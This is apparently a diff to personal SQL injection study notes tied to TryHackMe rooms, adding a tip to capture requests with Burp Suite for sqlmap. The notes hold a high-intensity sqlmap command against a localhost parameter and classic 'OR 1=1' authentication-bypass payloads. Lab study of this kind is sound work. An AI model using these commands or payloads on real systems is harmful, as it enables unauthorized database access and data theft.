@@ -5,6 +5,8 @@ https://tryhackme.com/room/sqlinjectionlm
 https://tryhackme.com/room/sqlmap
 sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
 
+Use Burpsuite to capture raw request (form), use this for the -u parameter of sqlmap.
+
 ## Auth Bypass
 'OR 1=1;--
 'OR 1=1#
